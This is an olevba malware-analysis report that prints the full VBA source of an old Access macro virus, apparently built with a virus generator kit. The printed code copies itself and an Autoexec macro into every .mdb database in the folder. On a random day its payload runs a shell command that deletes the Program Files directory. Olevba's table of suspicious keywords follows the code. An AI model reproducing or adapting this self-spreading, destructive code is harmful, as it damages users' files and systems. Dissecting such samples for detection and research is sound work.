olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Source-7f5bffc379db2bf88a553080c57b9fd4d71a58d0
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSOffice.Source-7f5bffc379db2bf88a553080c57b9fd4d71a58d0 
in file: Virus.MSOffice.Source-7f5bffc379db2bf88a553080c57b9fd4d71a58d0 - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'  Access Macro Generator by ULTRAS
'          Version 1.0

'Virus Name: 44
'Virus Author: 44
'03.07.2008 13:37:53

Option Compare Database
Option Explicit

Function  amg()
On Error Resume Next
Dim Fname, Virii, CBase As String
Virii = False
Fname = Dir("*.mdb", vbNormal)
If Fname <> "" Then
CBase = CurrentDb.Name
If CBase = Fname Then Virii = True
If Virii = False Then Application.DoCmd.TransferDatabase acExport, "Microsoft Access", Fname, acModule, "44", "44"
If Virii = False Then Application.DoCmd.TransferDatabase acExport, "Microsoft Access", Fname, acMacro, "Autoexec", "Autoexec "
While Fname <> "
Fname = Dir
If CBase = Fname Then Virii = True
If Virii = False Then Application.DoCmd.TransferDatabase acExport, "Microsoft Access", Fname, acModule, "44", "44"
If Virii = False Then Application.DoCmd.TransferDatabase acExport, "Microsoft Access", Fname, acMacro, "Autoexec", "Autoexec "
Wend
Call Payload
End If
End Function

Sub Payload
On Error Resume Next
If Day(Now()) = Int(Rnd() * 30) + 1 Then
Shell("Deltree  /y C:\Progra~1")
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
